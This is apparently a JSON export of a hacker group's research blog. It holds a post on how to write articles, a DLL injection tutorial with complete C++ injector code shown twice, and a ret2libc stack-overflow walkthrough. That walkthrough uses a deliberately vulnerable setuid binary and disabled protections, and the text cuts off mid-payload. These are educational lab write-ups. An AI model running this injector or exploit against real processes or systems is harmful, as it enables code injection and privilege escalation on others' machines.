{"pageProps":{"posts":[{"title":"Writing research posts","slug":"writing-research-posts","date_published":1635906784000,"date_updated":1635906915000,"tags":["How to","Tutorial"],"excerpt":"This guide will go over all the details and steps required to post a research article.","cover":"image.png","author":{"name":"Pips","avatar":"avatars/pips.jpg"},"content":"\nLets talk about how to write a research post to appear on the research portal https://801labs.org/research-portal/1/\n\nPreviously, we used the platform Ghost to write and publish research articles, how tos, and anouncments. This time around in the new website, we have had the research blog function built directly in. \n\nAll a user has to do to create an article\n* go into Github\n* navigate to the `/content/research` directory in the `main` branch.\n* create a new file with a dash seperated name, such as `example-post.md`\n* import the below code block into your new markdown file. This block of code instructs the website on how to display information about the post. This includes tags, a title, a cover image, an author, etc.\n\n\n```\n---\ntitle: <A solid Title>\nslug: a-good-slug\ndate_published: 2018-10-25T02:33:04.000Z\ndate_updated: 2018-10-25T02:35:15.000Z\ntags: tag1, tag2\nexcerpt: A brief little discription of what your post is about.\ncover: 'folder/for/image.jpg'\nauthor:\n  name: your name\n  avatar: 'avatars/youravatar.jpeg'\n---\n```\n\nIn the markdown preview, it will look like the below.\n\n"},{"title":"DLL injection - Developing a simple injector.","slug":"developing-a-dll-injector","date_published":1549513920000,"date_updated":1562884307000,"tags":["how to","DLL Injection","Windows Hacking","Development","memory","Windows API"],"excerpt":"\n[DLL injection](https://en.wikipedia.org/wiki/DLL_injection) is the process of forcing a running process to load a DLL (Dynamically Linked Library) of your choice. In this write-up, I'll walk you through the LoadLibraryA injection method. This causes the DLL to be loaded into the context of the process thus allowing us to execute our own code inside of the process's virtual memory space.\n\n\tI assume there is a base understanding of what a DLL is. By the end of this write-up, we'll have a functional DLL injector along with a bare-bone test DLL which we'll use for testing during development.\n\n\tWriting a DLL injector is pretty trivial and only requires a handful steps. Remember that DLLs are specific to Windows and there-for we'll be utilizing functions provided to us by the Windows API. The steps required for the task at hand are in order as follows:\n\n1. Acquire a handle to the remote process that you want to inject / load your DLL into. We do this by prompting for a process ID (PID) after displaying a list of processes w/ their PIDs.\n\n\n    // Get the remote target pid\n    uint16_t target_pid = get_target_pid();\n    \n    if (!target_pid) {\n    std::cerr << \"Getting remote target process ID failed...\" << std::endl;\n    return 1;\n    }\n    \n    // <snipped> ...\n    \n    // Obtain a handle to the target remote process.\n    HANDLE target_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);\n    \n    \n    if (target_process == NULL) {\n        std::cerr << \"Acquiring a handle to the remote target process failed...\" << std::endl;\n        return -1;\n    }\n\n*get_target_pid() function:*\n\n    \n    uint16_t get_target_pid() {\n    \tuint16_t pid = 0;\n    \t\n    \tstd::string pid_str;\n    \tbool first_input_entered = false;\n    \n    \tdo {\n    \t\tif (first_input_entered) {\n    \t\t\tsystem(\"cls\");\n    \t\t\tprint_banner();\n    \t\t\tstd::cerr << \"The given process ID is invalid, try again...\" << std::endl;\n    \t\t}\n    \n    \t\tprint_process_list();\n    \n    \t\tstd::cout << \"\\nEnter target process ID: \";\n    \t\tstd::getline(std::cin, pid_str);\n    \n    \t\tif (first_input_entered == false) {\n    \t\t\tfirst_input_entered = true;\n    \t\t}\n    \n    \t\tif (pid_str == \"exit\" ||\n    \t\t\tpid_str == \"quit\") {\n    \t\t\tbreak;\n    \t\t}\n    \n    \t} while (file_exists(pid_str) == false && !pid_str.size());\n    \n    \tif (pid_str != \"exit\" &&\n    \t\tpid_str != \"quit\") {\n    \t\tpid = (uint16_t)std::stoi(pid_str);\n    \t}\n    \n    \treturn pid;\n    }\n\n2. Create and store the DLL's absolute path in a variable.\n\n\n    // Get the dll's path that we want to inject into our remote target process.\n    std::string dll_path = get_dll_path();\n    \n    std::cout << \"DLL path: \" << dll_path << std::endl;\n\n*get_dll_path() function:*\n\n    std::string get_dll_path() {\n    \n    \tstd::string dll_path;\n    \tbool first_input_entered = false;\n    \n    \tdo {\n    \t\tif (first_input_entered) {\n    \t\t\tsystem(\"cls\");\n    \t\t\tprint_banner();\n    \t\t\tstd::cerr << \"Specified DLL path was invalid, try again...\" << std::endl;\n    \t\t}\n    \n    \t\tstd::cout << \"Enter path to DLL: \";\n    \t\tstd::getline(std::cin, dll_path);\n    \n    \t\tif (first_input_entered == false) {\n    \t\t\tfirst_input_entered = true;\n    \t\t}\n    \n    \t\tif (dll_path == \"exit\" ||\n    \t\t\tdll_path == \"quit\") {\n    \t\t\tbreak;\n    \t\t}\n    \n    \t} while (file_exists(dll_path) == false);\n    \n    \treturn dll_path;\n    }\n\n3. Now we need to allocate enough space in the remote process to store the DLLs absolute path. We achieve this by using Window's [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualallocex) function.\n\n\n    // Allocate space for our DLL path inside the target remote process.\n    LPVOID dll_path_in_remote_mem_addr = VirtualAllocEx(\n    \ttarget_process,\n    \tNULL,\n    \t_MAX_PATH,\n    \tMEM_RESERVE | MEM_COMMIT,\n    \tPAGE_EXECUTE_READWRITE\n    );\n    \n    if (dll_path_in_remote_mem_addr == NULL) {\n    \tstd::cerr << \"Allocating space for our DLL path in the remote target process's virtual memory space failed...\" << std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n    \n    std::cout << \"DLL allocation memory address: \" << &dll_path_in_remote_mem_addr << std::endl;\n\n4. And now that we've allocated and reserved enough memory for the DLL path, we can write it into that region of memory of the remote process using the Window's [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-writeprocessmemory) function. \n\n\n    // Copy the DLL path into the allocated memory region.\n    bool write_status = WriteProcessMemory(\n    \ttarget_process,\n    \tdll_path_in_remote_mem_addr,\n    \tdll_path.c_str(),\n    \tstrlen(dll_path.c_str()),\n    \tNULL\n    );\n    \n    std::cout << \"WriteProcessMemory was \" << (write_status ? \"successful!\" : \"unsuccessful...\") << std::endl;;\n    \n    if (!write_status) {\n    \tstd::cerr << \"GetLastError() for failed WriteProcessMemory() call: \" << GetLastError() << std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n\n5. Next, we'll need to obtain the address to the Window's [LoadLibraryA](https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-loadlibrarya) function. This is easily done through the Window's [GetProcAddress](https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-getprocaddress) function.\n\n\n    // Get the address to the LoadLibraryA Windows API function.\n    LPVOID load_library_addr = (LPVOID)GetProcAddress(\n    \tGetModuleHandle(\"kernel32.dll\"),\n    \t\"LoadLibraryA\"\n    );\n    \n    if (load_library_addr == NULL) {\n    \tstd::cerr << \"GetProcAddress failed...\" << std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n    \n    std::cout << \"LoadLibraryA address: \" << &load_library_addr << std::endl;\n\n6. Create a remote thread via [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread) and pass the handle we have on the remote process, the address to LoadLibraryA, and the memory address that our DLL path resides at. LoadLibraryA will be invoked and passed `dll_path_in_remote_mem_addr` by our call to CreateRemoteThread. This is where the magic happens and our DLL is loaded into the process.\n\n\n    // Create our remote thread for running our DLL code.\n    HANDLE remote_thread = CreateRemoteThread(\n    \ttarget_process,\n    \tNULL,\n    \tNULL,\n    \t(LPTHREAD_START_ROUTINE)load_library_addr,\n    \tdll_path_in_remote_mem_addr,\n    \tNULL,\n    \tNULL\n    );\n    \n    if (remote_thread == NULL) {\n    \tstd::cerr << \"CreateRemoteThread failed...\" << std::endl;\n    \treturn 1;\n    }\n    \n    std::cout << \"Remote thread address: \" << &remote_thread << std::endl;\n\n7. The last thing we do is deallocate the memory that was reserved for our DLL path using [VirtualFreeEx](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualfreeex) and then close our open handles using [CloseHandle](https://docs.microsoft.com/en-us/windows/desktop/api/handleapi/nf-handleapi-closehandle).\n\n\n    // Release the allocated memory we acquired from the remote process.\n    if (VirtualFreeEx(target_process, dll_path_in_remote_mem_addr, 0, MEM_RELEASE) == 0) {\n    \tstd::cerr << \"VirtualFreeEx failed on target process...\" << std::endl;\n    }\n    \n    // Free our handle on the remote thread\n    CloseHandle(remote_thread);\n    \n    // Free our handle on the remote process\n    CloseHandle(target_process);\n\nTying our code together and testing it out ~ we run `.\\InjectDLL.exe`, then enter the remote target PID, and finally the absolute path to `TestDLL.dll`. Our executable outputs some information about the injection indicating it was successful. Â \n\n![](2019/07/2019-05-02-090559_3440x1440_scrot.png \"Successful execution of our DLL injector\")\n\nOur injector indicated it was successful, but we can double check with Window's [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer). After installing it (if you don't have it installed already) we launch it, make sure the lower pane is visible by toggling it on. This can be achieved by checking the `View -> Show Lower Pane` option. Then, select the remote target process in the list and press the key combination `Ctrl + d`. You should now see a list of loaded DLLs. One of which is our DLL! \n\n![](2019/07/process-explorer-test-dll-injection-success.png \"Using Process Explorer, we can see that our TestDLL.dll file was injected into Game.exe successfully.\")\n\nOnce we have successfully loaded our DLL into the target process, we can access and reference anything within it's virtual memory space. In part 2, I'll demonstrate an example use case of DLL injection by showing how we can find an in-memory data structure (i.e. the offset to a player structure / class in a game).\n\nThe full source code for both the DLL injector and the Test DLL can be found in this [Github](https://github.com/selftaught/DLLinjector) repository.\n\nThanks for reading through this article! If you notice any issues in the write-up or code - please don't hesitate to message me! You can do so via [keybase](https://keybase.io/th3v0id) or [twitter](https://twitter.com/x74x76).\n","cover":"2019/07/process-explorer-test-dll-injection-success.png","author":{"name":"th3v0id","avatar":"avatars/th3v0id.jpg"},"content":"\n[DLL injection](https://en.wikipedia.org/wiki/DLL_injection) is the process of forcing a running process to load a DLL (Dynamically Linked Library) of your choice. In this write-up, I'll walk you through the LoadLibraryA injection method. This causes the DLL to be loaded into the context of the process thus allowing us to execute our own code inside of the process's virtual memory space.\n\n\tI assume there is a base understanding of what a DLL is. By the end of this write-up, we'll have a functional DLL injector along with a bare-bone test DLL which we'll use for testing during development.\n\n\tWriting a DLL injector is pretty trivial and only requires a handful steps. Remember that DLLs are specific to Windows and there-for we'll be utilizing functions provided to us by the Windows API. The steps required for the task at hand are in order as follows:\n\n1. Acquire a handle to the remote process that you want to inject / load your DLL into. We do this by prompting for a process ID (PID) after displaying a list of processes w/ their PIDs.\n\n\n    // Get the remote target pid\n    uint16_t target_pid = get_target_pid();\n    \n    if (!target_pid) {\n    std::cerr << \"Getting remote target process ID failed...\" << std::endl;\n    return 1;\n    }\n    \n    // <snipped> ...\n    \n    // Obtain a handle to the target remote process.\n    HANDLE target_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);\n    \n    \n    if (target_process == NULL) {\n        std::cerr << \"Acquiring a handle to the remote target process failed...\" << std::endl;\n        return -1;\n    }\n\n*get_target_pid() function:*\n\n    \n    uint16_t get_target_pid() {\n    \tuint16_t pid = 0;\n    \t\n    \tstd::string pid_str;\n    \tbool first_input_entered = false;\n    \n    \tdo {\n    \t\tif (first_input_entered) {\n    \t\t\tsystem(\"cls\");\n    \t\t\tprint_banner();\n    \t\t\tstd::cerr << \"The given process ID is invalid, try again...\" << std::endl;\n    \t\t}\n    \n    \t\tprint_process_list();\n    \n    \t\tstd::cout << \"\\nEnter target process ID: \";\n    \t\tstd::getline(std::cin, pid_str);\n    \n    \t\tif (first_input_entered == false) {\n    \t\t\tfirst_input_entered = true;\n    \t\t}\n    \n    \t\tif (pid_str == \"exit\" ||\n    \t\t\tpid_str == \"quit\") {\n    \t\t\tbreak;\n    \t\t}\n    \n    \t} while (file_exists(pid_str) == false && !pid_str.size());\n    \n    \tif (pid_str != \"exit\" &&\n    \t\tpid_str != \"quit\") {\n    \t\tpid = (uint16_t)std::stoi(pid_str);\n    \t}\n    \n    \treturn pid;\n    }\n\n2. Create and store the DLL's absolute path in a variable.\n\n\n    // Get the dll's path that we want to inject into our remote target process.\n    std::string dll_path = get_dll_path();\n    \n    std::cout << \"DLL path: \" << dll_path << std::endl;\n\n*get_dll_path() function:*\n\n    std::string get_dll_path() {\n    \n    \tstd::string dll_path;\n    \tbool first_input_entered = false;\n    \n    \tdo {\n    \t\tif (first_input_entered) {\n    \t\t\tsystem(\"cls\");\n    \t\t\tprint_banner();\n    \t\t\tstd::cerr << \"Specified DLL path was invalid, try again...\" << std::endl;\n    \t\t}\n    \n    \t\tstd::cout << \"Enter path to DLL: \";\n    \t\tstd::getline(std::cin, dll_path);\n    \n    \t\tif (first_input_entered == false) {\n    \t\t\tfirst_input_entered = true;\n    \t\t}\n    \n    \t\tif (dll_path == \"exit\" ||\n    \t\t\tdll_path == \"quit\") {\n    \t\t\tbreak;\n    \t\t}\n    \n    \t} while (file_exists(dll_path) == false);\n    \n    \treturn dll_path;\n    }\n\n3. Now we need to allocate enough space in the remote process to store the DLLs absolute path. We achieve this by using Window's [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualallocex) function.\n\n\n    // Allocate space for our DLL path inside the target remote process.\n    LPVOID dll_path_in_remote_mem_addr = VirtualAllocEx(\n    \ttarget_process,\n    \tNULL,\n    \t_MAX_PATH,\n    \tMEM_RESERVE | MEM_COMMIT,\n    \tPAGE_EXECUTE_READWRITE\n    );\n    \n    if (dll_path_in_remote_mem_addr == NULL) {\n    \tstd::cerr << \"Allocating space for our DLL path in the remote target process's virtual memory space failed...\" << std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n    \n    std::cout << \"DLL allocation memory address: \" << &dll_path_in_remote_mem_addr << std::endl;\n\n4. And now that we've allocated and reserved enough memory for the DLL path, we can write it into that region of memory of the remote process using the Window's [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-writeprocessmemory) function. \n\n\n    // Copy the DLL path into the allocated memory region.\n    bool write_status = WriteProcessMemory(\n    \ttarget_process,\n    \tdll_path_in_remote_mem_addr,\n    \tdll_path.c_str(),\n    \tstrlen(dll_path.c_str()),\n    \tNULL\n    );\n    \n    std::cout << \"WriteProcessMemory was \" << (write_status ? \"successful!\" : \"unsuccessful...\") << std::endl;;\n    \n    if (!write_status) {\n    \tstd::cerr << \"GetLastError() for failed WriteProcessMemory() call: \" << GetLastError() << std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n\n5. Next, we'll need to obtain the address to the Window's [LoadLibraryA](https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-loadlibrarya) function. This is easily done through the Window's [GetProcAddress](https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-getprocaddress) function.\n\n\n    // Get the address to the LoadLibraryA Windows API function.\n    LPVOID load_library_addr = (LPVOID)GetProcAddress(\n    \tGetModuleHandle(\"kernel32.dll\"),\n    \t\"LoadLibraryA\"\n    );\n    \n    if (load_library_addr == NULL) {\n    \tstd::cerr << \"GetProcAddress failed...\" << std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n    \n    std::cout << \"LoadLibraryA address: \" << &load_library_addr << std::endl;\n\n6. Create a remote thread via [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread) and pass the handle we have on the remote process, the address to LoadLibraryA, and the memory address that our DLL path resides at. LoadLibraryA will be invoked and passed `dll_path_in_remote_mem_addr` by our call to CreateRemoteThread. This is where the magic happens and our DLL is loaded into the process.\n\n\n    // Create our remote thread for running our DLL code.\n    HANDLE remote_thread = CreateRemoteThread(\n    \ttarget_process,\n    \tNULL,\n    \tNULL,\n    \t(LPTHREAD_START_ROUTINE)load_library_addr,\n    \tdll_path_in_remote_mem_addr,\n    \tNULL,\n    \tNULL\n    );\n    \n    if (remote_thread == NULL) {\n    \tstd::cerr << \"CreateRemoteThread failed...\" << std::endl;\n    \treturn 1;\n    }\n    \n    std::cout << \"Remote thread address: \" << &remote_thread << std::endl;\n\n7. The last thing we do is deallocate the memory that was reserved for our DLL path using [VirtualFreeEx](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualfreeex) and then close our open handles using [CloseHandle](https://docs.microsoft.com/en-us/windows/desktop/api/handleapi/nf-handleapi-closehandle).\n\n\n    // Release the allocated memory we acquired from the remote process.\n    if (VirtualFreeEx(target_process, dll_path_in_remote_mem_addr, 0, MEM_RELEASE) == 0) {\n    \tstd::cerr << \"VirtualFreeEx failed on target process...\" << std::endl;\n    }\n    \n    // Free our handle on the remote thread\n    CloseHandle(remote_thread);\n    \n    // Free our handle on the remote process\n    CloseHandle(target_process);\n\nTying our code together and testing it out ~ we run `.\\InjectDLL.exe`, then enter the remote target PID, and finally the absolute path to `TestDLL.dll`. Our executable outputs some information about the injection indicating it was successful. Â \n\n![](2019/07/2019-05-02-090559_3440x1440_scrot.png \"Successful execution of our DLL injector\")\n\nOur injector indicated it was successful, but we can double check with Window's [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer). After installing it (if you don't have it installed already) we launch it, make sure the lower pane is visible by toggling it on. This can be achieved by checking the `View -> Show Lower Pane` option. Then, select the remote target process in the list and press the key combination `Ctrl + d`. You should now see a list of loaded DLLs. One of which is our DLL! \n\n![](2019/07/process-explorer-test-dll-injection-success.png \"Using Process Explorer, we can see that our TestDLL.dll file was injected into Game.exe successfully.\")\n\nOnce we have successfully loaded our DLL into the target process, we can access and reference anything within it's virtual memory space. In part 2, I'll demonstrate an example use case of DLL injection by showing how we can find an in-memory data structure (i.e. the offset to a player structure / class in a game).\n\nThe full source code for both the DLL injector and the Test DLL can be found in this [Github](https://github.com/selftaught/DLLinjector) repository.\n\nThanks for reading through this article! If you notice any issues in the write-up or code - please don't hesitate to message me! You can do so via [keybase](https://keybase.io/th3v0id) or [twitter](https://twitter.com/x74x76).\n"},{"title":"Exploiting a Stack Buffer Overflow (ret2libc method)","slug":"stack-exploitation","date_published":1547813100000,"date_updated":1547814692000,"tags":["research","memory","how to","buffer overflow"],"excerpt":"\nA stack buffer overflow occurs when a program writes to a memory address on it's call stack outside of the intended structure / space.\n\nIn this walk-through, I'm going to cover the ret2libc (return-to-libc) method. This method of exploitation is great because it doesn't require the use of your typical shellcode. It involves making sys calls to the functions provided to us by libc (standard c library). We're going to use the `system` and `exit` sys calls for demonstration.\n\nTo have a good understanding about how stack overflows work, it's extremely helpful to know how stack data structures work, and more importantly - how the call stack works. For the sake of time, I'm not going to type out how these two things work in great detail. If you want to know how these work, I would recommend watching [stack](https://www.youtube.com/watch?v=7dLZRMDcY6c) and [call stack](https://www.youtube.com/watch?v=XbZQ-EonR_I).\n\n## Creating a vulnerable binary to test on\n\nTo practice carrying out a SOF, we create a vulnerable binary. The source below uses strcpy with no boundary checking. This is what makes the code vulnerable to a stack overflow attack. strcpy() will take whatever is in argv[1] and copy it into buf. Without boundary checking around strcpy() to make sure the length of argv[1] isn't greater than the width of the buffer, we can overrun the buffer and overwrite assembler instructions with our own.\n\n    #include <string.h>\n    #include <unistd.h>\n    #include <sys/cdefs.h>\n    \n    int main(int argc, char** argv) {\n    \n        setuid(0);\n    \n        if (argc > 1) {\n            char buf[256];\n            strcpy(buf, argv[1]);\n        }\n    \n        return 0;\n    }\n    \n\nFor the sake of simplicity and keeping this article to a sane length, I disable common buffer overflow protection (BOP) mechanisms including ASLR, Canaries, and NX bit. PIE and RelRO are disabled on my system by default. I also pass an option along to make the binary 32-bit.\n\n`gcc -g -Wall -mpreferred-stack-boundary=2 -fno-stack-protector -m32 -I. -z execstack -o bin/sof src/sof.c`\n\n- `-g`: Produces debugging information about the program that GDB (GNU Debugger) can use to aid us.\n- `-fno-stack-protector`: Disables stack smashing protectors (SSP).\n- `-z execstack`: Makes stack frames executable.\n- `-o sof`: Output (compiled) binary name will be sof.\n- `-mpreferred-stack-boundary=2`: aligns the stack boundary in our binary to 4 bytes.\n\nASLR can't be disabled via a compiler flag because it's a feature that's carried out and managed by the kernel. On Fedora, Debian, and Ubuntu, ASLR can be disabled by adding `kernel.randomize_va_space = 0` to `/etc/sysctl.conf` or `echo 0 > /proc/sys/kernel/randomize_va_space`. Other linux distributions may require a different approach. An easy way to determine if ASLR is enabled (it likely is if you didn't expliclity disable it) is to `cat /proc/sys/kernel/randomize_va_space`. If the output is a positive number, it's enabled.\n\n## Assembler dump breakdown\n\nLet's disassemble the main function in our binary, break it down, and talk about what happens at an assembler level.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    â  gdb -q \tbin/sof                                              \n    [*] No debugging session active\n    GEF for linux ready, type `gef' to start, `gef config' to configure\n    67 commands loaded for GDB Fedora 8.0.1-33.fc27 using Python engine 3.6\n    Reading symbols from bin/sof...done.\n    @gefâ¤  disassemble main\n    Dump of assembler code for function main:\n       0x08048416 <+0>:\tpush   ebp\n       0x08048417 <+1>:\tmov    ebp,esp\n       0x08048419 <+3>:\tsub    esp,0x100\n       0x0804841f <+9>:\tpush   0x0\n       0x08048421 <+11>:\tcall   0x8048300 <setuid@plt>\n       0x08048426 <+16>:\tadd    esp,0x4\n       0x08048429 <+19>:\tcmp    DWORD PTR [ebp+0x8],0x1\n       0x0804842d <+23>:\tjle    0x8048447 <main+49>\n       0x0804842f <+25>:\tmov    eax,DWORD PTR [ebp+0xc]\n       0x08048432 <+28>:\tadd    eax,0x4\n       0x08048435 <+31>:\tmov    eax,DWORD PTR [eax]\n       0x08048437 <+33>:\tpush   eax\n       0x08048438 <+34>:\tlea    eax,[ebp-0x100]\n       0x0804843e <+40>:\tpush   eax\n       0x0804843f <+41>:\tcall   0x80482e0 <strcpy@plt>\n       0x08048444 <+46>:\tadd    esp,0x8\n       0x08048447 <+49>:\tmov    eax,0x0\n       0x0804844c <+54>:\tleave  \n       0x0804844d <+55>:\tret    \n    End of assembler dump.\n    @gefâ¤  q\n    \n\n       0x08048416 <+0>:\tpush   ebp\n       0x08048417 <+1>:\tmov    ebp,esp\n       0x08048419 <+3>:\tsub    esp,0x100\n    \n\nThese first few lines above are called a function prologue. `push ebp` pushes our base pointer onto the stack. Then `mov ebp,esp` copies the value of `esp` (stack pointer) into the `ebp` register making `ebp` == `esp`. Next, `sub esp,0x100` moves the stack pointer 256 bytes (0x100 hex = 256) towards a lower memory address, reserving 256 bytes of data on the stack. This is space being reserved for `char buf[256]`.\n\n       0x0804841f <+9>:\tpush   0x0\n       0x08048421 <+11>:\tcall   0x8048300 <setuid@plt>\n    \n\nPush 0 onto the stack as an argument for the call to `setuid()`.\n\n       0x08048426 <+16>:\tadd    esp,0x4\n       0x08048429 <+19>:\tcmp    DWORD PTR [ebp+0x8],0x1\n       0x0804842d <+23>:\tjle    0x8048447 <main+49>\n    \n\nThe next instruction `cmp DWORD PTR [ebp+0x8],0x1` compares the first argument of main (argc) to 1. The following `jle` instruction uses the result of this comparison. It takes the result and jumps to `<main+39>` if the result is less than or equal to the value stored at `0x8048412`, which is 1. If you look at the C source above, you can see this is essentially our `if (argc >) {...}` condition.\n\n       0x0804842f <+25>:\tmov    eax,DWORD PTR [ebp+0xc]\n       0x08048432 <+28>:\tadd    eax,0x4\n       0x08048435 <+31>:\tmov    eax,DWORD PTR [eax]\n       0x08048437 <+33>:\tpush   eax\n    \n\nHere, we move the address stored at ebp+0xc into the eax register (this is the address to element 0 of argv). Then, we add 4 bytes to the address stored in the eax register. This results in the address of `argv[1]`. Next, `mov eax,DWORD PTR [eax]` takes the value at `argv[1]` and copies it into the `eax` register. `push eax` pushes this value onto the stack.\n\n       0x08048438 <+34>:\tlea    eax,[ebp-0x100]\n       0x0804843e <+40>:\tpush   eax\n    \n\n`lea eax,[ebp-0x100]` calculates the address of `ebp-0x100` and stores the address in `eax`. `push eax` pushes this address onto the stack.\n\n       0x0804843f <+41>:\tcall   0x80482e0 <strcpy@plt>\n    \n\nThe `call` instruction does a couple of things. It pushes the address of the instruction immediately following the call instruction onto the stack and then does an unconditional jump to `strcpy@plt`. The reason a return address is pushed onto the stack is so that when `strcpy@plt` finishes executing, the program knows where to return execution.\n\n       0x08048444 <+46>:\tadd    esp,0x8\n       0x08048447 <+49>:\tmov    eax,0x0\n       0x0804844c <+54>:\tleave  \n       0x0804844d <+55>:\tret    \n    \n\nThese last four instructions are a function epilog. This is just the opposite of a function prologue. Instead of setting up the stack, the epilog cleans up the stack. `add esp,0x8` adds 8 bytes to the address `esp` points to. Then `mov eax,0x0` zeros out whatever is stored in the `eax` register. The `leave` instruction does a couple of things. It releases the stack frame and then copies the base pointer (`ebp`) into `esp`. This releases the space that was allocated to the previous stack frame. Finally, the `ret` instruction pops the return address off the stack and transfers returns execution to the address that was pop'd.\n\n# Exploiting the SOF vulnerability\n\nNow that we have disabled common BOP features and understand the assembler of our vulnerable binary, we will begin exploiting. One of the first things I like to do (after reviewing the assembler dump) is to verify that an overflow exists by triggering a segmentation fault. This is done by providing data to a program which in our case, get's strcpy'd into a fixed width buffer.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    â  bin/sof $(perl -e 'print \"A\" x 260')\n    [1]    6406 segmentation fault (core dumped)  bin/sof $(perl -e 'print \"A\" x 260')\n    \n\nWhen we strcpy 260 'A' characters into the buffer, we get a segmentation fault. This is because we overwrote the four bytes of memory after the end of our buffer. Segmentation faults are exceptions that get raised by hardware with memory protection. It indicates that something tried writing to a region of memory it shouldn't have.\n\n## Creating the payload\n\nIn order to successfully call `system`, we need to place a few different values on the stack, when we overflow the buffer. We need the address of \"/bin/sh\" found in libc.so, an address that execution will return to when system has finished, and an address to the system call itself.\n\nTo get the address to '/bin/sh', we can calculate it by taking the starting address of libc.so and adding the offset of '/bin/sh' to it.\n\nTo see the absolute path to the libc.so library that our binary uses, we use `ldd`. This is needed for the next step.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  ldd bin/sof\n    \tlinux-gate.so.1 (0xf7fd2000)\n    \tlibc.so.6 => /lib/libc.so.6 (0xf7deb000)\n    \t/lib/ld-linux.so.2 (0xf7fd4000)\n    \n    \n\nNext, we use `strings` to report the offset of any string it finds in libc.so and grep the output for what we're after.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  strings -a -t x /lib/libc.so.6 | grep '/bin/sh'   \n     16a23e /bin/sh\n    \n\nRunning `vmmap` will also provide the starting address of libc.so when ran from a active gdb session.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    â  gdb -q bin/sof\n    \n    @gefâ¤  vmmap\n    Start      End        Offset     Perm Path\n    0x08048000 0x08049000 0x00000000 r-x /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n    0x08049000 0x0804a000 0x00000000 rwx /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n    0xf7deb000 0xf7fa4000 0x00000000 r-x /usr/lib/libc-2.26.so\n    0xf7fa4000 0xf7fa5000 0x001b9000 --- /usr/lib/libc-2.26.so\n    0xf7fa5000 0xf7fa7000 0x001b9000 r-x /usr/lib/libc-2.26.so\n    0xf7fa7000 0xf7fa8000 0x001bb000 rwx /usr/lib/libc-2.26.so\n    0xf7fa8000 0xf7fab000 0x00000000 rwx \n    0xf7fcd000 0xf7fcf000 0x00000000 rwx \n    0xf7fcf000 0xf7fd2000 0x00000000 r-- [vvar]\n    0xf7fd2000 0xf7fd4000 0x00000000 r-x [vdso]\n    0xf7fd4000 0xf7ffc000 0x00000000 r-x /usr/lib/ld-2.26.so\n    0xf7ffc000 0xf7ffd000 0x00027000 r-x /usr/lib/ld-2.26.so\n    0xf7ffd000 0xf7ffe000 0x00028000 rwx /usr/lib/ld-2.26.so\n    0xfffda000 0xffffe000 0x00000000 rwx [stack]\n    \n    @gefâ¤  q\n    \n\nWe calculate the address by taking the start address of `/usr/lib/libc-2.26.so` and add the offset of the string. I like to use `printf` for this. If you use printf in gdb, you have to add `shell` before the command so gdb doesn't try to interpret it as one it provides. Same applies to any shell command you want to run in gdb.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  printf \"0x%x\\n\" $((0xf7deb000 + 0x16a23e))  \n    0xf7f5523e\n    \n\nTo verify the address is correct, we can evaluate it in gdb, and see what string resides there. It should be '/bin/sh'.\n\n    @gefâ¤  x/s 0xf7f5523e\n    0xf7f5523e:\t\"/bin/sh\"\n    \n\nAnd now, we just need the address of `system`.\n\n    @gefâ¤  p system\n    $1 = {<text variable, no debug info>} 0xf7e2c540 <__libc_system>\n    \n    @gefâ¤  q\n    \n\nBecause I'm on a machine with an Intel processor and I compiled the binary for 32 bit systems, the addresses we found need to be reversed to conform with little-endian notation. If you have a processor that enforces little-endian notation, you will find yourself doing this often. I wrote this [script](https://gist.github.com/selftaught/5ba8e942f68ae38719243de8d07bcaea) that takes a memory address and reverses it.\n\nReverse system address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  raddr -a 0xf7e2c540\n    \\x40\\xc5\\xe2\\xf7\n    \n\nReverse \"/bin/sh\" string address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  raddr -a 0xf7f5523e\n    \\x3e\\x52\\xf5\\xf7\n    \n\nAnd for the return address, we can use anything for the time being.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    â   raddr -a 0xdeadc0de\n    \\xde\\xc0\\xad\\xd\n    \n\nWe modify the command we ran earlier, adding the reversed addresses onto the end of the payload.\n\n    #\n    # [      260 x \"A\" characters      ][  system() address  ][ random address ][ '/bin/sh' address ]\n    #\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  bin/sof $(perl -e 'print \"A\" x 260 . 